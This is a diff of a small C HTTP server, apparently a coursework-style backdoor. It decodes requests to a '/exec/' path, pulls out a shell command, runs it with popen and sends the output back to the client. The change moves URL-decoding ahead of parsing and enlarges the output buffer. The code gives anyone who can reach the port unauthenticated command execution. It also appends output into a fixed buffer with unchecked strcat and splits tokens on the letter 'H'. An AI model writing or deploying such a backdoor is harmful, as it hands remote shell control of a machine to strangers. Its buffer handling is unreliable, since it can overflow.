@@ -16,9 +16,8 @@ int parse(const char *request) {
 }
 
 char* get_cmd(char request[]) {
-    //size_t b4_cmd = strspn(request, "GET /exec/");
     request += 10;
-    char* token = strtok(request, " ");
+    char* token = strtok(request, "H");
     return token;
 }
 
@@ -81,11 +80,8 @@ int main(int argc, char *argv[]) {
     server_address.sin_addr.s_addr = INADDR_ANY;
 
     bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address));
-
     listen(server_socket, 1);    
 
-    //DOUBLE CHECK THIS HEADER FOR ACCURACY RE: RFC2616
-    //MUST ALLOW GET AND HEAD METHODS, NONE ELSE - code 405 method not allowed
     char *notfound_response =
         "HTTP/1.1 404 Not Found\r\n\r\n";
 
@@ -94,24 +90,22 @@ int main(int argc, char *argv[]) {
 
     int client_socket;
     char client_buffer[1024];
-
-    //Need to figure out how to safely close socket on ^C or SIGINT
+    char req[1024];
 
     while(1) {
         client_socket = accept(server_socket, NULL, NULL);
         recv(client_socket, &client_buffer, sizeof(client_buffer), 0);
-        int bd_check = parse(client_buffer);
+        decode(client_buffer, req);
+        int bd_check = parse(req);
 
         if (bd_check > 0) {
-            char* cmd = get_cmd(client_buffer);
-            char dc_cmd[strlen(cmd) + 1];
-            decode(cmd, dc_cmd);
+            char* cmd = get_cmd(req);
             
             char cart[1024];
-            char out[1024] = "";
+            char out[15000] = "";
             FILE *pipeout;
             
-            pipeout = popen(dc_cmd, "r");
+            pipeout = popen(cmd, "r");
             while (fgets(cart, sizeof(cart), pipeout) != NULL) {
                 strcat(out, cart);
             }
@@ -127,8 +121,5 @@ int main(int argc, char *argv[]) {
             close(client_socket);
         }
     }
-    
     return 0;
-
-    //Flush socket and close at end!!
 }
